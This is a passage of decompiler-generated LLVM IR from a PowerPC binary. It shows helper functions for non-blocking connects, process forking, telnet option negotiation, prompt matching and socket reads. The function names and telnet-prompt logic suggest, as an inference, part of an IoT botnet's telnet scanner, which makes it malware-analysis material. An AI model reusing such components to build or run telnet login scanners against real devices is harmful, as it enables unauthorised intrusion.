dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge: ; preds = %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge.dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge_crit_edge, %dec_label_pc_1000218c
  %v3_100021d0.pre = phi i32 [ %v2_100020bc, %dec_label_pc_1000218c ], [ %v3_100021d0.pre.pre, %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge.dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge_crit_edge ]
  %v1_100021e849 = phi i32 [ 1, %dec_label_pc_1000218c ], [ %v1_100021e8, %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge.dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge_crit_edge ]
  %v1_100021d4 = mul nuw nsw i32 %v1_100021e849, 4
  %v2_100021d8 = add i32 %v1_100021d4, %v3_100021d0.pre
  %v2_100021e0 = inttoptr i32 %v2_100021d8 to i32*
  store i32 0, i32* %v2_100021e0, align 4
  %v1_100021e8 = add nuw nsw i32 %v1_100021e849, 1
  %tmp44 = icmp ult i32 %v1_100021e8, 32
  br i1 %tmp44, label %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge.dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge_crit_edge, label %dec_label_pc_100021fc

dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge.dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge_crit_edge: ; preds = %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge
  %v3_100021d0.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge
  %v2_10002218 = load i32, i32* %v1_1000211c, align 4
  %v2_1000222c = or i32 %v2_10002218, %v3_1000212c
  store i32 %v2_1000222c, i32* %v1_1000211c, align 4
  store i32 268444272, i32* @lr, align 4
  %v5_1000226c = call i32 @__libc_select(i32 %v1_1000214c, i32 %v2_100020bc, i32 0, i32 %v2_100020bc, i32 %v2_10002158)
  %v2_1000227c = icmp sgt i32 %v5_1000226c, 0
  br i1 %v2_1000227c, label %dec_label_pc_1000232c.preheader, label %dec_label_pc_10002284

dec_label_pc_10002284:                            ; preds = %dec_label_pc_100021fc
  %v1_10002288 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002288, 10
  br i1 %tmp45, label %dec_label_pc_1000218c, label %dec_label_pc_1000232c.preheader

dec_label_pc_1000232c.preheader:                  ; preds = %dec_label_pc_10002284, %dec_label_pc_100021fc, %dec_label_pc_10002290.preheader, %dec_label_pc_10002100
  %v2_100022b8 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_1000232c

dec_label_pc_100022b0:                            ; preds = %dec_label_pc_1000232c
  %v3_100022b4 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 268444368, i32* @lr, align 4
  %v5_100022cc = call i32 @__libc_recv(i32 %v3_100022b4, i32 %v2_100022b8, i32 1, i32 0, i32 %v2_100022b8)
  %v3_100022d4 = icmp eq i32 %v5_100022cc, 1
  br i1 %v3_100022d4, label %dec_label_pc_100022f4, label %dec_label_pc_100022dc

dec_label_pc_100022dc:                            ; preds = %dec_label_pc_100022b0
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10002368

dec_label_pc_100022f4:                            ; preds = %dec_label_pc_100022b0
  %v3_100022f4 = load i8, i8* %stack_var_-32, align 1
  %v4_100022fc = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_100022f4, i8* %stack_var_-180.0, align 1
  %v1_10002308 = add i32 %v4_100022fc, 1
  %v5_1000230c = inttoptr i32 %v1_10002308 to i8*
  %v3_10002310 = load i8, i8* %stack_var_-32, align 1
  %v3_10002318 = icmp eq i8 %v3_10002310, 10
  br i1 %v3_10002318, label %dec_label_pc_10002354, label %dec_label_pc_10002320

dec_label_pc_10002320:                            ; preds = %dec_label_pc_100022f4
  %v1_10002324 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_1000232c

dec_label_pc_1000232c:                            ; preds = %dec_label_pc_1000232c.preheader, %dec_label_pc_10002320
  %stack_var_-180.0 = phi i8* [ %v5_1000230c, %dec_label_pc_10002320 ], [ %arg2, %dec_label_pc_1000232c.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10002324, %dec_label_pc_10002320 ], [ 0, %dec_label_pc_1000232c.preheader ]
  %v0_10002334 = call i32 @__asm_mfcr()
  %v1_10002338 = call i32 @__asm_rlwinm(i32 %v0_10002334, i32 30, i32 31, i32 31)
  %v1_1000233c = urem i32 %v1_10002338, 256
  %v3_1000234c = icmp eq i32 %v1_1000233c, 0
  br i1 %v3_1000234c, label %dec_label_pc_10002354, label %dec_label_pc_100022b0

dec_label_pc_10002354:                            ; preds = %dec_label_pc_1000232c, %dec_label_pc_100022f4
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_1000232c ], [ %v5_1000230c, %dec_label_pc_100022f4 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10002368

dec_label_pc_10002368:                            ; preds = %dec_label_pc_100022dc, %dec_label_pc_10002354
  %storemerge = phi i32 [ -1, %dec_label_pc_100022dc ], [ %stack_var_-184.0, %dec_label_pc_10002354 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_1000230c, { 1, 0 }
  uselistorder i32 %v1_10002288, { 1, 0 }
  uselistorder i32 %v1_100021e8, { 1, 0 }
  uselistorder i32 %v2_10002158, { 1, 0 }
  uselistorder i32* %v1_1000211c, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_100020bc, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002368, { 1, 0 }
  uselistorder label %dec_label_pc_1000232c, { 1, 0 }
  uselistorder label %dec_label_pc_1000218c, { 1, 0 }
  uselistorder label %dec_label_pc_100020d0, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444608, i32* @lr, align 4
  %v2_100023bc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100023e8.40 to i32), i32* @lr, align 4
  %v2_100023e4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100023f4 = urem i32 %arg3, 65536
  store i32 %v1_100023f4, i32* @r3, align 4
  %v1_100023fc = call i32 @htons(i32 %v1_100023f4)
  %v2_1000240c = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000241c = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_1000240c)
  %v3_10002424 = icmp eq i32 %v4_1000241c, 0
  br i1 %v3_10002424, label %dec_label_pc_10002438, label %dec_label_pc_1000242c

dec_label_pc_1000242c:                            ; preds = %entry
  br label %dec_label_pc_100025f8

dec_label_pc_10002438:                            ; preds = %entry
  store i32 268444772, i32* @lr, align 4
  %v3_10002460 = call i32 @__libc_connect(i32 %arg1, i32 %v2_1000240c, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002460, -1
  br i1 %tmp26, label %dec_label_pc_100025b4, label %dec_label_pc_10002478

dec_label_pc_10002478:                            ; preds = %dec_label_pc_10002438
  %v0_10002478 = call i32 @__errno_location()
  %v1_10002480 = inttoptr i32 %v0_10002478 to i32*
  %v2_10002480 = load i32, i32* %v1_10002480, align 4
  %v3_10002484 = icmp eq i32 %v2_10002480, 115
  br i1 %v3_10002484, label %dec_label_pc_1000248c, label %dec_label_pc_100025a8

dec_label_pc_1000248c:                            ; preds = %dec_label_pc_10002478
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_1000249c = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_1000249c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge

dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge: ; preds = %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge.dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge_crit_edge, %dec_label_pc_1000248c
  %v3_100024b4.pre = phi i32 [ %v2_1000249c, %dec_label_pc_1000248c ], [ %v3_100024b4.pre.pre, %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge.dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge_crit_edge ]
  %v1_100024cc30 = phi i32 [ 1, %dec_label_pc_1000248c ], [ %v1_100024cc, %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge.dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge_crit_edge ]
  %v1_100024b8 = mul nuw nsw i32 %v1_100024cc30, 4
  %v2_100024bc = add i32 %v1_100024b8, %v3_100024b4.pre
  %v2_100024c4 = inttoptr i32 %v2_100024bc to i32*
  store i32 0, i32* %v2_100024c4, align 4
  %v1_100024cc = add nuw nsw i32 %v1_100024cc30, 1
  %tmp27 = icmp ult i32 %v1_100024cc, 32
  br i1 %tmp27, label %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge.dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge_crit_edge, label %dec_label_pc_100024e0

dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge.dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge_crit_edge: ; preds = %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge
  %v3_100024b4.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge

dec_label_pc_100024e0:                            ; preds = %dec_label_pc_100024b0.dec_label_pc_100024b0_crit_edge
  %v1_100024e4 = udiv i32 %arg1, 32
  %v1_100024ec = mul nuw nsw i32 %v1_100024e4, 4
  %v2_100024f0 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100024f4 = add nuw nsw i32 %v1_100024ec, 32
  %v1_100024f8 = add i32 %v2_100024f4, %v2_100024f0
  %v1_100024fc = inttoptr i32 %v1_100024f8 to i32*
  %v2_100024fc = load i32, i32* %v1_100024fc, align 4
  %v1_10002504 = urem i32 %arg1, 32
  %v3_1000250c = shl i32 1, %v1_10002504
  %v2_10002510 = or i32 %v2_100024fc, %v3_1000250c
  store i32 %v2_10002510, i32* %v1_100024fc, align 4
  %v1_1000252c = add i32 %arg1, 1
  %v2_10002534 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445008, i32* @lr, align 4
  %v5_1000254c = call i32 @__libc_select(i32 %v1_1000252c, i32 0, i32 %v2_1000249c, i32 0, i32 %v2_10002534)
  %tmp28 = icmp slt i32 %v5_1000254c, 1
  br i1 %tmp28, label %dec_label_pc_1000259c, label %dec_label_pc_1000255c

dec_label_pc_1000255c:                            ; preds = %dec_label_pc_100024e0
  store i32 4, i32* %stack_var_-48, align 4
  %v2_10002564 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002568 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268445060, i32* @lr, align 4
  %v5_10002580 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_10002564, i32 %v2_10002568)
  %v3_10002584 = load i32, i32* %stack_var_-44, align 4
  %v3_10002588 = icmp eq i32 %v3_10002584, 0
  br i1 %v3_10002588, label %dec_label_pc_100025b4, label %dec_label_pc_10002590

dec_label_pc_10002590:                            ; preds = %dec_label_pc_1000255c
  br label %dec_label_pc_100025f8

dec_label_pc_1000259c:                            ; preds = %dec_label_pc_100024e0
  br label %dec_label_pc_100025f8

dec_label_pc_100025a8:                            ; preds = %dec_label_pc_10002478
  br label %dec_label_pc_100025f8

dec_label_pc_100025b4:                            ; preds = %dec_label_pc_1000255c, %dec_label_pc_10002438
  store i32 268445128, i32* @lr, align 4
  %v2_100025c4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_100025d4 = call i32 @__asm_rlwinm(i32 %v2_100025c4, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100025f0.41 to i32), i32* @lr, align 4
  %v2_100025ec = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100025a8, %dec_label_pc_1000259c, %dec_label_pc_10002590, %dec_label_pc_1000242c, %dec_label_pc_100025b4
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_100025b4 ], [ 0, %dec_label_pc_1000259c ], [ 0, %dec_label_pc_10002590 ], [ 0, %dec_label_pc_100025a8 ], [ 0, %dec_label_pc_1000242c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_100024cc, { 1, 0 }
  uselistorder i32 %v2_1000249c, { 1, 0, 2 }
  uselistorder i32 %v2_1000240c, { 1, 0 }
  uselistorder i32 %v1_100023f4, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100025f8, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445232, i32* @lr, align 4
  %v0_1000262c = call i32 @__libc_fork()
  %v3_1000263c = icmp eq i32 %v0_1000262c, 0
  br i1 %v3_1000263c, label %dec_label_pc_100027c0, label %dec_label_pc_10002650

dec_label_pc_10002650:                            ; preds = %entry
  %v3_10002658 = load i32, i32* @global_var_1001fda4.43, align 4
  %v2_1000265c = load i32, i32* @global_var_1001fda0.42, align 4
  %v1_10002660 = add i32 %v3_10002658, 1
  %v2_10002660 = icmp eq i32 %v3_10002658, -1
  %v2_10002664 = zext i1 %v2_10002660 to i32
  %v3_10002664 = add i32 %v2_10002664, %v2_1000265c
  store i32 %v3_10002664, i32* @global_var_1001fda0.42, align 4
  store i32 %v1_10002660, i32* @global_var_1001fda4.43, align 4
  %v1_10002694 = mul i32 %v1_10002660, 4
  %v1_1000269c = add i32 %v1_10002694, 4
  store i32 268445352, i32* @lr, align 4
  %v1_100026a4 = call i32 @malloc(i32 %v1_1000269c)
  br label %dec_label_pc_100026fc

dec_label_pc_100026bc:                            ; preds = %dec_label_pc_100026fc, %dec_label_pc_1000274c
  %v1_100026c0 = mul i32 %storemerge2, 4
  %v2_100026cc = add i32 %v1_100026c0, %v1_100026a4
  %v3_100026e0 = load i32, i32* @global_var_1001fdc0.44, align 4
  %v2_100026e4 = add i32 %v3_100026e0, %v1_100026c0
  %v1_100026e8 = inttoptr i32 %v2_100026e4 to i32*
  %v2_100026e8 = load i32, i32* %v1_100026e8, align 4
  %v2_100026ec = inttoptr i32 %v2_100026cc to i32*
  store i32 %v2_100026e8, i32* %v2_100026ec, align 4
  %v1_100026f4 = add i32 %storemerge2, 1
  br label %dec_label_pc_100026fc

dec_label_pc_100026fc:                            ; preds = %dec_label_pc_10002650, %dec_label_pc_100026bc
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002650 ], [ %v1_100026f4, %dec_label_pc_100026bc ]
  %v3_10002724 = load i32, i32* @global_var_1001fda4.43, align 4
  %v2_10002728 = load i32, i32* @global_var_1001fda0.42, align 4
  %v2_1000272c = icmp ne i32 %v3_10002724, 0
  %v3_10002730 = add i32 %v2_10002728, -1
  %v4_10002730 = sext i1 %v2_1000272c to i32
  %v3_10002744 = icmp eq i32 %v3_10002730, %v4_10002730
  br i1 %v3_10002744, label %dec_label_pc_1000274c, label %dec_label_pc_100026bc

dec_label_pc_1000274c:                            ; preds = %dec_label_pc_100026fc
  %v1_1000272c = add i32 %v3_10002724, -1
  %v3_10002764 = icmp ugt i32 %v1_1000272c, %storemerge2
  br i1 %v3_10002764, label %dec_label_pc_100026bc, label %dec_label_pc_1000276c

dec_label_pc_1000276c:                            ; preds = %dec_label_pc_1000274c
  %v1_10002780 = mul i32 %v3_10002724, 4
  %v2_1000278c = add i32 %v1_100026a4, -4
  %v1_10002790 = add i32 %v2_1000278c, %v1_10002780
  %v2_10002798 = inttoptr i32 %v1_10002790 to i32*
  store i32 %v0_1000262c, i32* %v2_10002798, align 4
  %v3_100027a0 = load i32, i32* @global_var_1001fdc0.44, align 4
  store i32 268445612, i32* @lr, align 4
  %v1_100027a8 = call i32 @free(i32 %v3_100027a0)
  store i32 %v1_100026a4, i32* @global_var_1001fdc0.44, align 4
  br label %dec_label_pc_100027c0

dec_label_pc_100027c0:                            ; preds = %entry, %dec_label_pc_1000276c
  ret i32 %v0_1000262c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_100026c0, { 1, 0 }
  uselistorder i32 %v1_100026a4, { 1, 2, 0 }
  uselistorder i32 %v3_10002658, { 1, 0 }
  uselistorder label %dec_label_pc_100027c0, { 1, 0 }
  uselistorder label %dec_label_pc_100026fc, { 1, 0 }
  uselistorder label %dec_label_pc_100026bc, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002804 = add i32 %arg2, 1
  %v1_10002808 = inttoptr i32 %v1_10002804 to i8*
  %v2_10002808 = load i8, i8* %v1_10002808, align 1
  %v1_10002818 = icmp ult i8 %v2_10002808, -5
  br i1 %v1_10002818, label %dec_label_pc_10002970, label %dec_label_pc_10002820

dec_label_pc_10002820:                            ; preds = %entry
  %v2_10002824 = icmp eq i8 %v2_10002808, -1
  br i1 %v2_10002824, label %dec_label_pc_1000282c, label %dec_label_pc_10002848

dec_label_pc_1000282c:                            ; preds = %dec_label_pc_10002820
  br label %dec_label_pc_10002970

dec_label_pc_10002848:                            ; preds = %dec_label_pc_10002820
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002854 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268445800, i32* @lr, align 4
  %v4_10002864 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002854, i32 1, i32 16384)
  %v2_10002870 = load i8, i8* %v1_10002808, align 1
  %v3_10002878 = icmp eq i8 %v2_10002870, -4
  br i1 %v3_10002878, label %dec_label_pc_10002880, label %dec_label_pc_1000288c

dec_label_pc_10002880:                            ; preds = %dec_label_pc_10002848
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002934

dec_label_pc_1000288c:                            ; preds = %dec_label_pc_10002848
  %v2_10002894 = load i8, i8* %v1_10002808, align 1
  %v3_1000289c = icmp eq i8 %v2_10002894, -2
  br i1 %v3_1000289c, label %dec_label_pc_100028a4, label %dec_label_pc_100028b0

dec_label_pc_100028a4:                            ; preds = %dec_label_pc_1000288c
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002934

dec_label_pc_100028b0:                            ; preds = %dec_label_pc_1000288c
  %v2_100028b8 = load i8, i8* %v1_10002808, align 1
  %v3_100028c0 = icmp eq i8 %v2_100028b8, 3
  br i1 %v3_100028c0, label %dec_label_pc_100028c8, label %dec_label_pc_10002900

dec_label_pc_100028c8:                            ; preds = %dec_label_pc_100028b0
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002934

dec_label_pc_10002900:                            ; preds = %dec_label_pc_100028b0
  %v3_100028d8 = icmp eq i8 %v2_100028b8, -3
  %.7 = select i1 %v3_100028d8, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002934

dec_label_pc_10002934:                            ; preds = %dec_label_pc_100028c8, %dec_label_pc_100028a4, %dec_label_pc_10002880, %dec_label_pc_10002900
  store i32 268446028, i32* @lr, align 4
  %v4_10002948 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002854, i32 1, i32 16384)
  %v1_10002950 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002968.45 to i32), i32* @lr, align 4
  %v4_10002964 = call i32 @__libc_send(i32 %arg1, i32 %v1_10002950, i32 1, i32 16384)
  br label %dec_label_pc_10002970

dec_label_pc_10002970:                            ; preds = %dec_label_pc_1000282c, %dec_label_pc_10002934, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002970, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002934, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_100029bc = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_1000e284.46 to i32), i32* @r3, align 4
  %v0_10002af810 = call i32 @__GI_strlen()
  %v2_10002b0012 = icmp eq i32 %v0_10002af810, 0
  br i1 %v2_10002b0012, label %dec_label_pc_10002b10, label %dec_label_pc_100029e8.preheader.lr.ph

dec_label_pc_100029e8.preheader.lr.ph:            ; preds = %entry
  %v2_10002a04 = add i32 %v0_100029bc, %arg1
  br label %dec_label_pc_100029e8.preheader

dec_label_pc_100029dc:                            ; preds = %dec_label_pc_10002a70, %dec_label_pc_10002a48, %dec_label_pc_10002a20, %dec_label_pc_100029f8
  %v1_100029e0 = add nsw i32 %stack_var_-40.08, 1
  %v3_100029f0 = icmp sgt i32 %v0_100029bc, %v1_100029e0
  br i1 %v3_100029f0, label %dec_label_pc_100029f8, label %dec_label_pc_10002a98

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_100029e8.preheader, %dec_label_pc_100029dc
  %stack_var_-40.08 = phi i32 [ %v1_100029e0, %dec_label_pc_100029dc ], [ %stack_var_-40.115, %dec_label_pc_100029e8.preheader ]
  %v2_10002a0c = sub i32 %v2_10002a04, %stack_var_-40.08
  %v1_10002a10 = inttoptr i32 %v2_10002a0c to i8*
  %v2_10002a10 = load i8, i8* %v1_10002a10, align 1
  %v3_10002a18 = icmp eq i8 %v2_10002a10, 0
  br i1 %v3_10002a18, label %dec_label_pc_100029dc, label %dec_label_pc_10002a20

dec_label_pc_10002a20:                            ; preds = %dec_label_pc_100029f8
  %v2_10002a38 = load i8, i8* %v1_10002a10, align 1
  %v3_10002a40 = icmp eq i8 %v2_10002a38, 32
  br i1 %v3_10002a40, label %dec_label_pc_100029dc, label %dec_label_pc_10002a48

dec_label_pc_10002a48:                            ; preds = %dec_label_pc_10002a20
  %v2_10002a60 = load i8, i8* %v1_10002a10, align 1
  %v3_10002a68 = icmp eq i8 %v2_10002a60, 13
  br i1 %v3_10002a68, label %dec_label_pc_100029dc, label %dec_label_pc_10002a70

dec_label_pc_10002a70:                            ; preds = %dec_label_pc_10002a48
  %v2_10002a88 = load i8, i8* %v1_10002a10, align 1
  %v3_10002a90 = icmp eq i8 %v2_10002a88, 10
  br i1 %v3_10002a90, label %dec_label_pc_100029dc, label %dec_label_pc_10002a98

dec_label_pc_10002a98:                            ; preds = %dec_label_pc_10002a70, %dec_label_pc_100029dc, %dec_label_pc_100029e8.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_100029e8.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002a70 ], [ %v1_100029e0, %dec_label_pc_100029dc ]
  %v2_10002aac = sub i32 %v2_10002a04, %stack_var_-40.0.lcssa
  %v1_10002ab0 = inttoptr i32 %v2_10002aac to i8*
  %v2_10002ab0 = load i8, i8* %v1_10002ab0, align 1
  %v2_10002ac4 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_1000e284.46 to i32)
  %v1_10002ac8 = inttoptr i32 %v2_10002ac4 to i8*
  %v2_10002ac8 = load i8, i8* %v1_10002ac8, align 1
  %v4_10002ad0 = icmp eq i8 %v2_10002ab0, %v2_10002ac8
  br i1 %v4_10002ad0, label %dec_label_pc_10002b10, label %dec_label_pc_10002ae4

dec_label_pc_10002ae4:                            ; preds = %dec_label_pc_10002a98
  %v1_10002ae8 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_1000e284.46 to i32), i32* @r3, align 4
  %v0_10002af8 = call i32 @__GI_strlen()
  %v2_10002b00 = icmp ult i32 %v1_10002ae8, %v0_10002af8
  br i1 %v2_10002b00, label %dec_label_pc_100029e8.preheader, label %dec_label_pc_10002b10

dec_label_pc_100029e8.preheader:                  ; preds = %dec_label_pc_100029e8.preheader.lr.ph, %dec_label_pc_10002ae4
  %storemerge316 = phi i32 [ 0, %dec_label_pc_100029e8.preheader.lr.ph ], [ %v1_10002ae8, %dec_label_pc_10002ae4 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_100029e8.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002ae4 ]
  %v3_100029f06 = icmp sgt i32 %v0_100029bc, %stack_var_-40.115
  br i1 %v3_100029f06, label %dec_label_pc_100029f8, label %dec_label_pc_10002a98

dec_label_pc_10002b10:                            ; preds = %entry, %dec_label_pc_10002a98, %dec_label_pc_10002ae4
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002a98 ], [ 0, %dec_label_pc_10002ae4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002ae8, { 1, 0 }
  uselistorder i32 %v0_100029bc, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1000e284.46 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002b10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100029e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002a98, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002b64 = load i32, i32* %r10.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002da45 = add i32 %v0_10002b64, 2
  %v2_10002dac6 = icmp slt i32 %v1_10002da45, %arg7
  br i1 %v2_10002dac6, label %dec_label_pc_10002db4.lr.ph, label %dec_label_pc_10002de4

dec_label_pc_10002db4.lr.ph:                      ; preds = %entry
  %v2_10002b9c = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002be4 = udiv i32 %arg1, 32
  %v1_10002bec = mul nuw nsw i32 %v1_10002be4, 4
  %v2_10002bf0 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002bf4 = add nuw nsw i32 %v1_10002bec, 24
  %v1_10002bf8 = add i32 %v2_10002bf4, %v2_10002bf0
  %v1_10002bfc = inttoptr i32 %v1_10002bf8 to i32*
  %v1_10002c04 = urem i32 %arg1, 32
  %v3_10002c0c = shl i32 1, %v1_10002c04
  %v1_10002c2c = add i32 %arg1, 1
  %v2_10002c34 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002d64 = inttoptr i32 %arg2 to i8*
  %v3_10002d78 = icmp eq i32 %arg3, 0
  %v2_10002dc4 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002db4

dec_label_pc_10002b9c:                            ; preds = %dec_label_pc_10002dc0, %dec_label_pc_10002db4
  store i32 %v2_10002b9c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge

dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge: ; preds = %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge.dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge_crit_edge, %dec_label_pc_10002b9c
  %v3_10002bb4.pre = phi i32 [ %v2_10002b9c, %dec_label_pc_10002b9c ], [ %v3_10002bb4.pre.pre, %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge.dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge_crit_edge ]
  %v1_10002bcc36 = phi i32 [ 1, %dec_label_pc_10002b9c ], [ %v1_10002bcc, %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge.dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge_crit_edge ]
  %v1_10002bb8 = mul nuw nsw i32 %v1_10002bcc36, 4
  %v2_10002bbc = add i32 %v1_10002bb8, %v3_10002bb4.pre
  %v2_10002bc4 = inttoptr i32 %v2_10002bbc to i32*
  store i32 0, i32* %v2_10002bc4, align 4
  %v1_10002bcc = add nuw nsw i32 %v1_10002bcc36, 1
  %tmp33 = icmp ult i32 %v1_10002bcc, 32
